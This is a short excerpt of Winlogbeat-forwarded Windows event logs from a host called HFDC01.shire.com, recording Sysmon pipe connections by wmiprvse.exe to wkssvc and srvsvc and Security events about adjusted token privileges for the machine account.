{"@timestamp":"2019-05-18T20:43:15.174Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_id":18,"version":1,"thread_id":2860,"log_name":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"event_data":{"ProcessGuid":"{905CC552-514E-5CD3-0000-00100AE0230C}","ProcessId":"6964","PipeName":"\\wkssvc","Image":"C:\\Windows\\system32\\wbem\\wmiprvse.exe","UtcTime":"2019-05-18 20:43:15.161"},"level":"Information","host":{"name":"WECserver"},"type":"wineventlog","source_name":"Microsoft-Windows-Sysmon","computer_name":"HFDC01.shire.com","opcode":"Info","process_id":1368,"task":"Pipe Connected (rule: PipeEvent)","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"message":"Pipe Connected:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.161\nProcessGuid: {905CC552-514E-5CD3-0000-00100AE0230C}\nProcessId: 6964\nPipeName: \\wkssvc\nImage: C:\\Windows\\system32\\wbem\\wmiprvse.exe","record_number":"5402620"}
{"@timestamp":"2019-05-18T20:43:15.174Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"computer_name":"HFDC01.shire.com","version":1,"type":"wineventlog","message":"Pipe Connected:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.161\nProcessGuid: {905CC552-514E-5CD3-0000-00100AE0230C}\nProcessId: 6964\nPipeName: \\srvsvc\nImage: C:\\Windows\\system32\\wbem\\wmiprvse.exe","event_id":18,"event_data":{"Image":"C:\\Windows\\system32\\wbem\\wmiprvse.exe","UtcTime":"2019-05-18 20:43:15.161","ProcessGuid":"{905CC552-514E-5CD3-0000-00100AE0230C}","ProcessId":"6964","PipeName":"\\srvsvc"},"record_number":"5402621","source_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","opcode":"Info","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"process_id":1368,"task":"Pipe Connected (rule: PipeEvent)","level":"Information","log_name":"Microsoft-Windows-Sysmon/Operational","thread_id":2860}
{"@timestamp":"2019-05-18T20:43:15.162Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"source_name":"Microsoft-Windows-Security-Auditing","message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","opcode":"Info","level":"Information","host":{"name":"WECserver"},"computer_name":"HFDC01.shire.com","record_number":"12283297","type":"wineventlog","log_name":"Security","event_id":4703,"process_id":4,"provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","task":"Token Right Adjusted Events","thread_id":3584,"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"keywords":["Audit Success"],"event_data":{"SubjectUserName":"HFDC01$","DisabledPrivilegeList":"-","TargetDomainName":"SHIRE","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e7","TargetLogonId":"0x3e7","SubjectUserSid":"S-1-5-18","TargetUserSid":"S-1-0-0","TargetUserName":"HFDC01$","ProcessId":"0x2d0","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege"}}
{"@timestamp":"2019-05-18T20:43:15.175Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"computer_name":"HFDC01.shire.com","level":"Information","record_number":"5402622","event_id":18,"type":"wineventlog","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","source_name":"Microsoft-Windows-Sysmon","message":"Pipe Connected:\nRuleName: \nUtcTime: 2019-05-18 20:43:15.161\nProcessGuid: {905CC552-514E-5CD3-0000-00100AE0230C}\nProcessId: 6964\nPipeName: \\srvsvc\nImage: C:\\Windows\\system32\\wbem\\wmiprvse.exe","thread_id":2860,"user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"event_data":{"PipeName":"\\srvsvc","Image":"C:\\Windows\\system32\\wbem\\wmiprvse.exe","UtcTime":"2019-05-18 20:43:15.161","ProcessGuid":"{905CC552-514E-5CD3-0000-00100AE0230C}","ProcessId":"6964"},"version":1,"task":"Pipe Connected (rule: PipeEvent)","host":{"name":"WECserver"},"log_name":"Microsoft-Windows-Sysmon/Operational","opcode":"Info","process_id":1368,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"}}
{"@timestamp":"2019-05-18T20:43:15.163Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_id":4703,"message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","keywords":["Audit Success"],"process_id":4,"source_name":"Microsoft-Windows-Security-Auditing","level":"Information","log_name":"Security","opcode":"Info","event_data":{"TargetUserSid":"S-1-0-0","TargetDomainName":"SHIRE","ProcessId":"0x2d0","SubjectUserSid":"S-1-5-18","SubjectUserName":"HFDC01$","TargetUserName":"HFDC01$","SubjectDomainName":"SHIRE","SubjectLogonId":"0x3e7","TargetLogonId":"0x3e7","ProcessName":"C:\\Windows\\System32\\svchost.exe","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","DisabledPrivilegeList":"-"},"thread_id":3584,"computer_name":"HFDC01.shire.com","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","type":"wineventlog","beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"task":"Token Right Adjusted Events","host":{"name":"WECserver"},"record_number":"12283298"}
{"@timestamp":"2019-05-18T20:43:15.165Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"level":"Information","record_number":"12283299","host":{"name":"WECserver"},"provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","keywords":["Audit Success"],"process_id":4,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"type":"wineventlog","thread_id":3584,"event_data":{"SubjectUserName":"HFDC01$","SubjectDomainName":"SHIRE","SubjectUserSid":"S-1-5-18","SubjectLogonId":"0x3e7","TargetLogonId":"0x3e7","ProcessName":"C:\\Windows\\System32\\svchost.exe","ProcessId":"0x2d0","DisabledPrivilegeList":"-","TargetUserName":"HFDC01$","TargetDomainName":"SHIRE","EnabledPrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege","TargetUserSid":"S-1-0-0"},"log_name":"Security","event_id":4703,"source_name":"Microsoft-Windows-Security-Auditing","opcode":"Info","message":"A token right was adjusted.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nTarget Account:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tHFDC01$\n\tAccount Domain:\t\tSHIRE\n\tLogon ID:\t\t0x3E7\n\nProcess Information:\n\tProcess ID:\t\t0x2d0\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nEnabled Privileges:\n\t\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeIncreaseQuotaPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeSystemtimePrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeShutdownPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeUndockPrivilege\n\t\t\tSeManageVolumePrivilege\n\nDisabled Privileges:\n\t\t\t-","task":"Token Right Adjusted Events","computer_name":"HFDC01.shire.com"}
